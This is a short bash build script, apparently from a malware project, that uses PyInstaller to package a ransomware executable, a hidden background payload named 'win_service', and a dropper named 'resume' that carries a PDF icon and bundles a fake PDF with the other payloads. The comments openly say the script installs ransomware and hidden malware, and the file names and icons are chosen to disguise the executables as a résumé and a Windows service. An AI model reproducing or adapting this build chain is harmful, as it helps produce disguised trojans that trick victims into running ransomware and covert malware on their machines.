#!/bin/bash
python -m pip install -r requirements.txt

#install ransomware
python -m PyInstaller --onefile --noconsole --icon=ransomware.ico --add-data "hack.jpg;." --name ransomware ./ransomware.py

#install hidden malware
python -m PyInstaller --onefile --noconsole --icon=terminal.ico --add-data "hack.jpg;." --name win_service ./payload_background.py

#if runsomware doesn't work install without it
python -m PyInstaller --onefile --noconsole --icon=pdf.ico --add-data "Fake.pdf;." --add-data "hack.jpg;." --add-data "win_service.exe;." --name resume ./payload.py

#install the malware with ransomware
python -m PyInstaller --onefile --noconsole --icon=pdf.ico --add-data "Fake.pdf;." --add-data "ransomware.exe;." --add-data "hack.jpg;." --add-data "win_service.exe;." --name resume ./payload.py